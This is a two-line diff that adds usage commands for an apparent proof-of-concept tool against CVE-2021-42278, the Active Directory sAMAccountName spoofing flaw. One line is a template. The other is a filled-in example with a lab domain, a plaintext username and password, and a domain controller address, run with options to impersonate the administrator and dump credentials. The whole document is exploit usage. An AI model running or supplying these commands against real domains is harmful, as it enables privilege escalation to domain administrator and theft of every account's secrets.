@@ -1,0 +1,2 @@
+poc_sAMAccountName_cve202142278 $DOMAIN/$username:'$password' -dc-ip $DC_IP
+poc_sAMAccountName_cve202142278 cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump
